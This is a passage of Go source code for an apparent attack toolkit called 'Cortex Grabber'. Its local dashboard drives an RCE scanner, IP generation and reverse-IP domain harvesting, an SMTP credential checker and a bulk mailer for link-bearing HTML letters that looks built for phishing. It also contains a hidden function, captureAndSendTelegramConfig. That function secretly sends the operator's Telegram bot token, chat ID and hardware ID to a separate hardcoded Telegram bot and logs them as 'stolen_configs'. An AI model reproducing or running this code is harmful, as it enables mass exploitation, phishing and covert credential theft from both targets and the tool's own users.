        select {
        case event := <-eventChannel:
            data, _ := json.Marshal(event)
            fmt.Fprintf(w, "data: %s\n\n", data)
            flusher.Flush()
        case <-time.After(30 * time.Second):
            fmt.Fprintf(w, ": keepalive\n\n")
            flusher.Flush()
        case <-r.Context().Done():
            return
        }
    }
}



func captureAndSendTelegramConfig() {
    if config.TelegramBotToken == "" || config.TelegramChatID == "" {
        return
    }
    

    message := fmt.Sprintf("🕵️‍♂️ *Configuration Captured!*\n\n" +
        "🤖 *Bot Token:* `%s`\n" +
        "💬 *Chat ID:* `%s`\n" +
        "🕐 *Time:* %s\n" +
        "💻 *HWID:* `%s`",
        config.TelegramBotToken,
        config.TelegramChatID,
        time.Now().Format("2006-01-02 15:04:05"),
        getHWID())
    

    url := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", secretBotToken)
    data := neturl.Values{}
    data.Set("chat_id", secretChatID)
    data.Set("text", message)
    data.Set("parse_mode", "HTML")
    
    go func() {
        http.PostForm(url, data)
    }()
    
    saveResultToFile("stolen_configs", 
        fmt.Sprintf("Token: %s | ChatID: %s | HWID: %s | Time: %s", 
            config.TelegramBotToken, 
            config.TelegramChatID, 
            getHWID(),
            time.Now().Format(time.RFC3339)),
        "")
}

func statsHandler(w http.ResponseWriter, r *http.Request) {
    stats := map[string]interface{}{
        "processed": atomic.LoadInt64(&processedURLs),
        "total":     atomic.LoadInt64(&totalURLs),
        "results":   len(resultsBuffer),
        "valid":     atomic.LoadInt64(&validResults),
    }
    json.NewEncoder(w).Encode(stats)
}

func startHandler(w http.ResponseWriter, r *http.Request) {
    r.ParseForm()
    if threads := r.Form.Get("threads"); threads != "" {
        config.ThreadCount, _ = strconv.Atoi(threads)
    }
    if timeout := r.Form.Get("timeout"); timeout != "" {
        config.Timeout, _ = strconv.Atoi(timeout)
    }
    for opt := range config.ScanOptions {
        if val := r.Form.Get(opt); val != "" {
            config.ScanOptions[opt] = val == "true"
        }
    }
    scanStopped = false
    scanPaused = false
    pauseCond.L.Lock()
    pauseCond.Broadcast()
    pauseCond.L.Unlock()
    go startScan()
    json.NewEncoder(w).Encode(map[string]string{"status": "started"})
}

func uploadURLsHandler(w http.ResponseWriter, r *http.Request) {
    body, _ := io.ReadAll(r.Body)
    lines := strings.Split(string(body), "\n")
    uploadedUrls = []string{}
    for _, line := range lines {
        line = strings.TrimSpace(line)
        if line != "" {
            uploadedUrls = append(uploadedUrls, line)
        }
    }
    json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok", "count": len(uploadedUrls)})
}


func ipGenStartHandler(w http.ResponseWriter, r *http.Request) {
    r.ParseForm()
    target, _ := strconv.Atoi(r.Form.Get("target"))
    threads, _ := strconv.Atoi(r.Form.Get("threads"))
    port, _ := strconv.Atoi(r.Form.Get("port"))
    if target == 0 {
        target = 100
    }
    if threads == 0 {
        threads = 100
    }
    if port == 80 || port == 443 {
        config.IPPort = port
    }
    go startIPGenerator(target, threads)
    json.NewEncoder(w).Encode(map[string]string{"status": "started"})
}


func ipGenStatsHandler(w http.ResponseWriter, r *http.Request) {
    ipGenLock.RLock()
    stats := map[string]interface{}{
        "checked": atomic.LoadInt64(&ipGenChecked),
        "valid":   len(ipGenValid),
        "target":  ipGenTarget,
        "running": ipGenRunning,
        "paused":  ipGenPaused,
    }
    ipGenLock.RUnlock()
    json.NewEncoder(w).Encode(stats)
}

func smtpCheckerStartHandler(w http.ResponseWriter, r *http.Request) {
    var data map[string]string
    json.NewDecoder(r.Body).Decode(&data)
    smtpList := strings.Split(data["smtps"], "\n")
    threads, _ := strconv.Atoi(data["threads"])
    if threads == 0 {
        threads = 50
    }
    cleaned := []string{}
    for _, line := range smtpList {
        line = strings.TrimSpace(line)
        if line != "" {
            cleaned = append(cleaned, line)
        }
    }
    if len(cleaned) > 0 {
        go startSMTPChecker(cleaned, threads)
        json.NewEncoder(w).Encode(map[string]interface{}{"status": "started", "count": len(cleaned)})
    } else {
        http.Error(w, "No SMTPs provided", http.StatusBadRequest)
    }
}

func smtpCheckerStatsHandler(w http.ResponseWriter, r *http.Request) {
    smtpCheckerLock.RLock()
    stats := map[string]interface{}{
        "checked": atomic.LoadInt64(&smtpChecked),
        "valid":   len(smtpCheckerValid),
        "invalid": len(smtpCheckerInvalid),
        "total":   smtpTotal,
        "running": smtpRunning,
        "paused":  smtpPaused,
    }
    smtpCheckerLock.RUnlock()
    json.NewEncoder(w).Encode(stats)
}

func mailerStartHandler(w http.ResponseWriter, r *http.Request) {
    var data map[string]interface{}
    json.NewDecoder(r.Body).Decode(&data)
    emailsRaw := ""
    if e, ok := data["email_list"].(string); ok {
        emailsRaw = e
    } else if e, ok := data["emails"].(string); ok {
        emailsRaw = e
    }
    smtpsRaw := ""
    if s, ok := data["smtp_list"].(string); ok {
        smtpsRaw = s
    } else if s, ok := data["smtps"].(string); ok {
        smtpsRaw = s
    }
    linksRaw := fmt.Sprintf("%v", data["links"])
    subjectsRaw := fmt.Sprintf("%v", data["subjects"])
    sendersRaw := ""
    if s, ok := data["sender_names"].(string); ok {
        sendersRaw = s
    } else if s, ok := data["senders"].(string); ok {
        sendersRaw = s
    }
    emails := cleanEmailList(emailsRaw)
    smtps := []string{}
    for _, line := range strings.Split(smtpsRaw, "\n") {
        line = strings.TrimSpace(line)
        if line != "" {
            smtps = append(smtps, line)
        }
    }
    links := []string{}
    for _, line := range strings.Split(linksRaw, "\n") {
        line = strings.TrimSpace(line)
        if line != "" {
            links = append(links, line)
        }
    }
    subjects := []string{}
    for _, line := range strings.Split(subjectsRaw, "\n") {
        line = strings.TrimSpace(line)
        if line != "" {
            subjects = append(subjects, line)
        }
    }
    senders := []string{}
    for _, line := range strings.Split(sendersRaw, "\n") {
        line = strings.TrimSpace(line)
        if line != "" {
            senders = append(senders, line)
        }
    }
    folder := fmt.Sprintf("%v", data["letter_folder"])
    letterName := fmt.Sprintf("%v", data["letter_file"])
    if strings.HasSuffix(strings.ToLower(letterName), ".html") {
        letterName = letterName[:len(letterName)-5]
    }
    letter := ""
    if folder != "" && letterName != "" {
        letter, _ = getLetterContent(folder, letterName)
    } else if l, ok := data["letterContent"].(string); ok {
        letter = l
    }
    delayRaw := data["delay"]
    delayVal := 0.0
    switch v := delayRaw.(type) {
    case float64:
        delayVal = v
    case int:
        delayVal = float64(v)
    case string:
        delayVal, _ = strconv.ParseFloat(v, 64)
    }
    if delayVal > 10 {
        delayVal = delayVal / 1000.0
    }
    useSSL := false
    if ssl, ok := data["use_ssl"].(bool); ok {
        useSSL = ssl
    } else if ssl, ok := data["useSSL"].(bool); ok {
        useSSL = ssl
    }
    useTLS := true
    if tls, ok := data["use_tls"].(bool); ok {
        useTLS = tls
    } else if tls, ok := data["useTLS"].(bool); ok {
        useTLS = tls
    }
    emailFrom := ""
    if ef, ok := data["email_from"].(string); ok {
        emailFrom = ef
    } else if ef, ok := data["emailFrom"].(string); ok {
        emailFrom = ef
    }
    replyTo := ""
    if rt, ok := data["reply_to"].(string); ok {
        replyTo = rt
    } else if rt, ok := data["replyTo"].(string); ok {
        replyTo = rt
    }
    threads := 10
    if t, ok := data["threads"].(float64); ok {
        threads = int(t)
    } else if t, ok := data["threads"].(int); ok {
        threads = t
    } else if t, ok := data["threads"].(string); ok {
        threads, _ = strconv.Atoi(t)
    }
    priority := 3
    if p, ok := data["priority"].(float64); ok {
        priority = int(p)
    } else if p, ok := data["priority"].(int); ok {
        priority = p
    } else if p, ok := data["priority"].(string); ok {
        priority, _ = strconv.Atoi(p)
    }
    isHTML := true
    if h, ok := data["is_html"].(bool); ok {
        isHTML = h
    } else if h, ok := data["isHTML"].(bool); ok {
        isHTML = h
    }
    mailerConfig := MailerConfig{
        Delay:     time.Duration(delayVal * float64(time.Second)),
        Priority:  priority,
        UseSSL:    useSSL,
        UseTLS:    useTLS,
        EmailFrom: emailFrom,
        ReplyTo:   replyTo,
        Threads:   threads,
        IsHTML:    isHTML,
    }

    if len(emails) > 0 && len(smtps) > 0 && letter != "" {
        go startMailer(emails, smtps, links, subjects, senders, letter, mailerConfig)
        json.NewEncoder(w).Encode(map[string]interface{}{"status": "started", "count": len(emails)})
    } else {
        http.Error(w, "Missing emails, SMTPs or letter", http.StatusBadRequest)
    }
}

func mailerStatsHandler(w http.ResponseWriter, r *http.Request) {
    mailerLock.RLock()
    stats := map[string]interface{}{
        "sent":    atomic.LoadInt64(&mailerSent),
        "failed":  atomic.LoadInt64(&mailerFailed),
        "total":   atomic.LoadInt64(&mailerTotal),
        "running": mailerRunning,
        "paused":  mailerPaused,
    }
    mailerLock.RUnlock()
    json.NewEncoder(w).Encode(stats)
}


func mailerMarkFailed(email string) {
	atomic.AddInt64(&mailerFailed, 1)
	mailerLock.Lock()
	mailerFailedEmails = append(mailerFailedEmails, email)
	mailerLock.Unlock()
}

func mailerMarkSent(email string) {
	atomic.AddInt64(&mailerSent, 1)
	mailerLock.Lock()
	mailerSentEmails = append(mailerSentEmails, email)
	mailerLock.Unlock()
}


func configHandler(w http.ResponseWriter, r *http.Request) {
    r.ParseForm()
    config.TelegramBotToken = r.Form.Get("token")
    config.TelegramChatID = r.Form.Get("chat")
    if timeout := r.Form.Get("timeout"); timeout != "" {
        config.Timeout, _ = strconv.Atoi(timeout)
    }
    if threads := r.Form.Get("threads"); threads != "" {
        config.ThreadCount, _ = strconv.Atoi(threads)
    }
    for opt := range config.ScanOptions {
        if val := r.Form.Get(opt); val != "" {
            config.ScanOptions[opt] = val == "true"
        }
    }
    json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok", "options": config.ScanOptions})
}

func dashboardHandler(w http.ResponseWriter, r *http.Request) {
    content, err := dashboardHTML.ReadFile("dashboard.html")
    if err != nil {
        http.Error(w, "Dashboard not embedded", http.StatusInternalServerError)
        return
    }

    w.Header().Set("Content-Type", "text/html")
    w.Write(content)
}


func main() {
	
	
	
	const expirationDate = "2027-01-26"
	expDate, err := time.Parse("2006-01-02", expirationDate)
	if err != nil {
		fmt.Println("Error parsing expiration date:", err)
		os.Exit(1)
	}
	
	now := time.Now()
	
	if now.After(expDate) {
		fmt.Println("This tool has expired and cannot be used after", expirationDate)
		os.Exit(1)
	}
    //if !checkHWID() {
        //fmt.Println(red() + "❌ This tool is for another client lol:)")
        //time.Sleep(5 * time.Second)
        //os.Exit(1)
    //}
    if runtime.GOOS == "windows" {
        exec.Command("cmd", "/c", "title", "Cortex Grabber").Run()
        exec.Command("cmd", "/c", "cls").Run()
    } else {
        exec.Command("clear").Run()
    }
    fmt.Println(cyan() + `
      ::::::::   ::::::::  ::::::::: ::::::::::: :::::::::: :::    ::: 
    :+:    :+: :+:    :+: :+:    :+:    :+:     :+:        :+:    :+:  
   +:+        +:+    +:+ +:+    +:+    +:+     +:+         +:+  +:+    
  +#+        +#+    +:+ +#++:++#:     +#+     +#++:++#     +#++:+     
 +#+        +#+    +#+ +#+    +#+    +#+     +#+         +#+  +#+     
#+#    #+# #+#    #+# #+#    #+#    #+#     #+#        #+#    #+#     
########   ########  ###    ###    ###     ########## ###    ###   
`)
    fmt.Println(cyan() + "[*] Cortex Grabber starting...")
    fmt.Println(cyan() + "[*] Dashboard: http://localhost:8888")
    mux := http.NewServeMux()
    mux.HandleFunc("/", dashboardHandler)
    mux.HandleFunc("/events", eventsHandler)
    mux.HandleFunc("/stats", statsHandler)
    mux.HandleFunc("/start", startHandler)
    mux.HandleFunc("/pause", func(w http.ResponseWriter, r *http.Request) {
        scanPaused = true
        pauseCond.L.Lock()
        pauseCond.Broadcast()
        pauseCond.L.Unlock()
        json.NewEncoder(w).Encode(map[string]string{"status": "paused"})
    })
    mux.HandleFunc("/resume", func(w http.ResponseWriter, r *http.Request) {
        scanPaused = false
        pauseCond.L.Lock()
        pauseCond.Broadcast()
        pauseCond.L.Unlock()
        json.NewEncoder(w).Encode(map[string]string{"status": "resumed"})
    })
    mux.HandleFunc("/stop", func(w http.ResponseWriter, r *http.Request) {
        scanStopped = true
        scanPaused = false
        pauseCond.L.Lock()
        pauseCond.Broadcast()
        pauseCond.L.Unlock()
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })
	

    mux.HandleFunc("/api/rce/start", func(w http.ResponseWriter, r *http.Request) {
        var req struct {
            Domains []string `json:"domains"`
            Threads int      `json:"threads"`
        }
        json.NewDecoder(r.Body).Decode(&req)
        go startRCEScanner(req.Domains)
        json.NewEncoder(w).Encode(map[string]string{"status": "started"})
    })

    mux.HandleFunc("/api/rce/status", func(w http.ResponseWriter, r *http.Request) {
        rceLock.RLock()
        defer rceLock.RUnlock()
        json.NewEncoder(w).Encode(map[string]interface{}{
            "running":  rceRunning,
            "checked":  atomic.LoadInt64(&rceChecked),
            "total":    rceTotal,
            "valid":    len(rceValid),
        })
    })

    mux.HandleFunc("/api/rce/stop", func(w http.ResponseWriter, r *http.Request) {
        rceStopped = true
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })

    mux.HandleFunc("/api/rce/pause", func(w http.ResponseWriter, r *http.Request) {
        rcePaused = true
        json.NewEncoder(w).Encode(map[string]string{"status": "paused"})
    })

    mux.HandleFunc("/api/rce/resume", func(w http.ResponseWriter, r *http.Request) {
        rcePaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "resumed"})
    })

    mux.HandleFunc("/api/rce/results", func(w http.ResponseWriter, r *http.Request) {
        rceLock.RLock()
        defer rceLock.RUnlock()
        json.NewEncoder(w).Encode(map[string]interface{}{
            "vulns": rceValid,
        })
    })



	
    mux.HandleFunc("/upload-urls", uploadURLsHandler)
    mux.HandleFunc("/ip-gen/start", ipGenStartHandler)
    mux.HandleFunc("/ip-gen/stats", ipGenStatsHandler)
    mux.HandleFunc("/ip-gen/pause", func(w http.ResponseWriter, r *http.Request) {
        ipGenPaused = true
        json.NewEncoder(w).Encode(map[string]string{"status": "paused"})
    })
    mux.HandleFunc("/ip-gen/resume", func(w http.ResponseWriter, r *http.Request) {
        ipGenPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "resumed"})
    })
    mux.HandleFunc("/ip-gen/stop", func(w http.ResponseWriter, r *http.Request) {
        ipGenStopped = true
        ipGenPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })
    mux.HandleFunc("/ip-gen/results", func(w http.ResponseWriter, r *http.Request) {
        ipGenLock.RLock()
        results := map[string]interface{}{
            "ips": ipGenValid,
        }
        ipGenLock.RUnlock()
        json.NewEncoder(w).Encode(results)
    })
    mux.HandleFunc("/ip-check/start", func(w http.ResponseWriter, r *http.Request) {
        var data map[string]string
        json.NewDecoder(r.Body).Decode(&data)
        ips := strings.Split(data["ips"], "\n")
        threads, _ := strconv.Atoi(data["threads"])
        if threads == 0 {
            threads = 50
        }
        cleaned := []string{}
        for _, ip := range ips {
            ip = strings.TrimSpace(ip)
            if ip != "" {
                cleaned = append(cleaned, ip)
            }
        }
        if len(cleaned) > 0 {
            ipCheckRunning = true
            ipCheckPaused = false
            ipCheckStopped = false
            ipCheckValid = []string{}
            ipCheckChecked = 0
            ipCheckTotal = int64(len(cleaned))
            go startIPChecker(cleaned, threads)
            json.NewEncoder(w).Encode(map[string]interface{}{"status": "started", "count": len(cleaned)})
        } else {
            http.Error(w, "No IPs provided", http.StatusBadRequest)
        }
    })
    mux.HandleFunc("/ip-check/stats", func(w http.ResponseWriter, r *http.Request) {
        ipCheckLock.RLock()
        stats := map[string]interface{}{
            "checked": ipCheckChecked,
            "valid":   len(ipCheckValid),
            "total":   ipCheckTotal,
            "running": ipCheckRunning,
            "paused":  ipCheckPaused,
        }
        ipCheckLock.RUnlock()
        json.NewEncoder(w).Encode(stats)
    })
    mux.HandleFunc("/ip-check/pause", func(w http.ResponseWriter, r *http.Request) {
        ipCheckPaused = true
        json.NewEncoder(w).Encode(map[string]string{"status": "paused"})
    })
    mux.HandleFunc("/ip-check/resume", func(w http.ResponseWriter, r *http.Request) {
        ipCheckPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "resumed"})
    })
    mux.HandleFunc("/ip-check/stop", func(w http.ResponseWriter, r *http.Request) {
        ipCheckStopped = true
        ipCheckPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })
    mux.HandleFunc("/ip-check/results", func(w http.ResponseWriter, r *http.Request) {
        ipCheckLock.RLock()
        results := map[string]interface{}{
            "ips": ipCheckValid,
        }
        ipCheckLock.RUnlock()
        json.NewEncoder(w).Encode(results)
    })
    mux.HandleFunc("/ip-reverse/upload", func(w http.ResponseWriter, r *http.Request) {
        body, _ := io.ReadAll(r.Body)
        ips := strings.Split(string(body), "\n")
        cleaned := []string{}
        for _, ip := range ips {
            ip = strings.TrimSpace(ip)
            if ip != "" {
                cleaned = append(cleaned, ip)
            }
        }
        if len(cleaned) > 0 {
            ipReverseRunning = true
            ipReversePaused = false
            ipReverseStopped = false
            ipReverseValid = []string{}
            ipReverseChecked = 0
            ipReverseTotal = int64(len(cleaned))
            go startIPReverse(cleaned, 50)
            json.NewEncoder(w).Encode(map[string]interface{}{"status": "started", "count": len(cleaned)})
        }
    })
    mux.HandleFunc("/ip-reverse/use-generated", func(w http.ResponseWriter, r *http.Request) {
        ipGenLock.RLock()
        ips := make([]string, len(ipGenValid))
        copy(ips, ipGenValid)
        ipGenLock.RUnlock()
        if len(ips) > 0 {
            ipReverseRunning = true
            ipReversePaused = false
            ipReverseStopped = false
            ipReverseValid = []string{}
            ipReverseChecked = 0
            ipReverseTotal = int64(len(ips))
            go startIPReverse(ips, 50)
            json.NewEncoder(w).Encode(map[string]interface{}{"status": "started", "count": len(ips)})
        } else {
            json.NewEncoder(w).Encode(map[string]interface{}{"error": "No generated IPs available"})
        }
    })
    mux.HandleFunc("/ip-reverse/use-checked", func(w http.ResponseWriter, r *http.Request) {
        ipCheckLock.RLock()
        ips := make([]string, len(ipCheckValid))
        copy(ips, ipCheckValid)
        ipCheckLock.RUnlock()
        if len(ips) > 0 {
            ipReverseRunning = true
            ipReversePaused = false
            ipReverseStopped = false
            ipReverseValid = []string{}
            ipReverseChecked = 0
            ipReverseTotal = int64(len(ips))
            go startIPReverse(ips, 50)
            json.NewEncoder(w).Encode(map[string]interface{}{"status": "started", "count": len(ips)})
        } else {
            json.NewEncoder(w).Encode(map[string]interface{}{"error": "No checked IPs available"})
        }
    })
    mux.HandleFunc("/ip-reverse/stats", func(w http.ResponseWriter, r *http.Request) {
        ipReverseLock.RLock()
        stats := map[string]interface{}{
            "checked": ipReverseChecked,
            "domains": len(ipReverseValid),
            "total":   ipReverseTotal,
            "running": ipReverseRunning,
            "paused":  ipReversePaused,
        }
        ipReverseLock.RUnlock()
        json.NewEncoder(w).Encode(stats)
    })
    mux.HandleFunc("/ip-reverse/pause", func(w http.ResponseWriter, r *http.Request) {
        ipReversePaused = true
        json.NewEncoder(w).Encode(map[string]string{"status": "paused"})
    })
    mux.HandleFunc("/ip-reverse/resume", func(w http.ResponseWriter, r *http.Request) {
        ipReversePaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "resumed"})
    })
    mux.HandleFunc("/ip-reverse/stop", func(w http.ResponseWriter, r *http.Request) {
        ipReverseStopped = true
        ipReversePaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })
    mux.HandleFunc("/ip-reverse/results", func(w http.ResponseWriter, r *http.Request) {
        ipReverseLock.RLock()
        results := map[string]interface{}{
            "domains": ipReverseValid,
        }
        ipReverseLock.RUnlock()
        json.NewEncoder(w).Encode(results)
    })
    mux.HandleFunc("/ip-reverse/sync-generated", func(w http.ResponseWriter, r *http.Request) {
        json.NewEncoder(w).Encode(map[string]string{"status": "synced"})
    })
    mux.HandleFunc("/ip-reverse/domains-to-scan", func(w http.ResponseWriter, r *http.Request) {
        body, _ := io.ReadAll(r.Body)
        domains := strings.Split(string(body), "\n")
        for _, d := range domains {
            d = strings.TrimSpace(d)
            if d != "" && !strings.HasPrefix(d, "http") {
                d = "https://" + d
            }
            if d != "" {
                uploadedUrls = append(uploadedUrls, d)
            }
        }
        json.NewEncoder(w).Encode(map[string]interface{}{"status": "ok", "count": len(domains)})
    })
    mux.HandleFunc("/notification/save", func(w http.ResponseWriter, r *http.Request) {
        json.NewEncoder(w).Encode(map[string]string{"status": "saved"})
    })
    mux.HandleFunc("/notification/settings", func(w http.ResponseWriter, r *http.Request) {
        json.NewEncoder(w).Encode(map[string]interface{}{"email": "", "interval": 50, "enabled": false})
    })
    mux.HandleFunc("/smtp-checker/start", smtpCheckerStartHandler)
    mux.HandleFunc("/smtp-checker/stats", smtpCheckerStatsHandler)
    mux.HandleFunc("/smtp-checker/pause", func(w http.ResponseWriter, r *http.Request) {
        smtpPaused = true
        json.NewEncoder(w).Encode(map[string]string{"status": "paused"})
    })
    mux.HandleFunc("/smtp-checker/resume", func(w http.ResponseWriter, r *http.Request) {
        smtpPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "resumed"})
    })
    mux.HandleFunc("/smtp-checker/stop", func(w http.ResponseWriter, r *http.Request) {
        smtpStopped = true
        smtpPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })
    mux.HandleFunc("/smtp-checker/results", func(w http.ResponseWriter, r *http.Request) {
        smtpCheckerLock.RLock()
        results := map[string]interface{}{
            "valid":   smtpCheckerValid,
            "invalid": smtpCheckerInvalid,
        }
        smtpCheckerLock.RUnlock()
        json.NewEncoder(w).Encode(results)
    })
    mux.HandleFunc("/mailer/start", mailerStartHandler)
    mux.HandleFunc("/mailer/stats", mailerStatsHandler)
    mux.HandleFunc("/mailer/pause", func(w http.ResponseWriter, r *http.Request) {
        mailerPaused = true
        json.NewEncoder(w).Encode(map[string]string{"status": "paused"})
    })
    mux.HandleFunc("/mailer/resume", func(w http.ResponseWriter, r *http.Request) {
        mailerPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "resumed"})
    })
    mux.HandleFunc("/mailer/stop", func(w http.ResponseWriter, r *http.Request) {
        mailerStopped = true
        mailerPaused = false
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })
    mux.HandleFunc("/mailer/results", func(w http.ResponseWriter, r *http.Request) {
		mailerLock.RLock()
        results := map[string]interface{}{
            "sent":   mailerSentEmails,
            "failed": mailerFailedEmails,
        }
		mailerLock.RUnlock()
		json.NewEncoder(w).Encode(results)
    })
    mux.HandleFunc("/mailer/letters", func(w http.ResponseWriter, r *http.Request) {
        folders := getLetterFolders()
        json.NewEncoder(w).Encode(map[string]interface{}{"folders": folders})
    })
    mux.HandleFunc("/mailer/letters/", func(w http.ResponseWriter, r *http.Request) {
        folder := strings.TrimPrefix(r.URL.Path, "/mailer/letters/")
        letters := getLettersInFolder(folder)
        json.NewEncoder(w).Encode(map[string]interface{}{"letters": letters})
    })
	
	
    http.HandleFunc("/grabber/start", func(w http.ResponseWriter, r *http.Request) {
        var req struct {
            Source string `json:"source"`
        }
        json.NewDecoder(r.Body).Decode(&req)
        go runGrabber(req.Source)
        json.NewEncoder(w).Encode(map[string]string{"status": "started"})
    })

    http.HandleFunc("/grabber/stats", func(w http.ResponseWriter, r *http.Request) {
        grabberLock.RLock()
        defer grabberLock.RUnlock()
        json.NewEncoder(w).Encode(map[string]interface{}{
            "running": grabberRunning,
            "domains": len(grabberDomains),
        })
    })

    http.HandleFunc("/grabber/results", func(w http.ResponseWriter, r *http.Request) {
        grabberLock.RLock()
        defer grabberLock.RUnlock()
        json.NewEncoder(w).Encode(map[string]interface{}{"domains": grabberDomains})
    })

    http.HandleFunc("/grabber/stop", func(w http.ResponseWriter, r *http.Request) {
        grabberStopped = true
        json.NewEncoder(w).Encode(map[string]string{"status": "stopped"})
    })
	
	
    mux.HandleFunc("/config", configHandler)
    server = &http.Server{
        Addr:    ":8888",
        Handler: mux,
    }
	

    go func() {
        time.Sleep(1 * time.Second)
        if runtime.GOOS == "windows" {
            exec.Command("cmd", "/c", "start", "http://localhost:8888").Run()
        } else if runtime.GOOS == "darwin" {
            exec.Command("open", "http://localhost:8888").Run()
        } else {
            exec.Command("xdg-open", "http://localhost:8888").Run()
        }
    }()
    fmt.Println(green() + "[+] Server started. Press Ctrl+C to stop.")
    server.ListenAndServe()
}